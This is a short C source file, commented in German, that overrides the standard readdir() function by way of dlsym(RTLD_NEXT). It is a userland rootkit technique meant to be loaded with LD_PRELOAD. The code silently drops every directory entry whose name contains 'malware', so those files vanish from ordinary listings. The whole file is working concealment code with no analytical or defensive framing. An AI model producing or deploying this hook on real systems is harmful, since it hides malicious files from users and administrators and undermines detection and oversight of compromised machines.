#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

//ptr auf die originale readdir-Funktion
static struct dirent *(*og_readdir)(DIR *) = NULL;

//die überschriebene readdir funktion
struct dirent *readdir(DIR *verzeichnis) {
    //lad die originale readdir funktion, falls noch nicht geladen
    if (!og_readdir) {
        og_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!og_readdir) {
            fprintf(stderr, "Fehler: Originale readdir-Funktion konnte nicht gefunden werden: %s\n", dlerror());
            return NULL;
        }
    }

    //call die originale readdir funktion auf
    struct dirent *item;
    do {
        item = og_readdir(verzeichnis);
        //wenn item NULL ist, wurde das ende des verzeichnis erreicht
        if (!item) {
            return NULL;
        }
        //skip items, die "malware" im namen haben
    } while (strstr(item->d_name, "malware") != NULL);

    //giibt das item zurück, wenn nicht gefiltert
    return item;
}